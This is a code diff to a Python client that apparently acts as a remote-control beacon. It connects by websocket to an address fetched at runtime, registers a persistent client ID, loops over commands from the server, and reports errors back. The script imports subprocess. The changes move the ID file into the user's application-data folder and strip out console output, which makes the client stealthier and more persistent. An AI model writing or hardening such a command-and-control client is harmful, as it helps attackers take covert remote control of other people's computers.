@@ -3,12 +3,12 @@ import websockets
 import requests
 import socket
 import json
-import time
 import subprocess
 import os
 import uuid
 
-ID_FILE = "client_id.txt"
+APPDATA_DIR = os.getenv("APPDATA") or os.path.expanduser("~/.config")
+ID_FILE = os.path.join(APPDATA_DIR, "id.txt")
 
 def get_client_id():
     if os.path.exists(ID_FILE):
@@ -30,15 +30,14 @@ def get_address():
 
 def has_internet():
     try:
-        requests.get("https://1.1.1.1", timeout=3)
+        requests.get("https://www.google.com", timeout=3)
         return True
-    except:
+    except requests.RequestException:
         return False
 
 async def connect_and_listen(address):
     async with websockets.connect(f"wss://{address}") as ws:
         await ws.send(json.dumps({"id": CLIENT_ID}))
-
         while True:
             msg = await ws.recv()
             data = json.loads(msg)
@@ -59,24 +58,21 @@ async def connect_and_listen(address):
             except Exception as e:
                 await ws.send(json.dumps({"id": CLIENT_ID, "error": str(e)}))
 
-
 async def main():
     while True:
         if not has_internet():
-            time.sleep(60)
+            await asyncio.sleep(60)
             continue
 
         address = get_address()
-        print(address)
         if not address:
-            time.sleep(60)
+            await asyncio.sleep(60)
             continue
 
         try:
             await connect_and_listen(address)
-        except Exception as e:
-            print("Error")
-            time.sleep(120)
+        except Exception:
+            await asyncio.sleep(120)
 
 if __name__ == "__main__":
     asyncio.run(main())
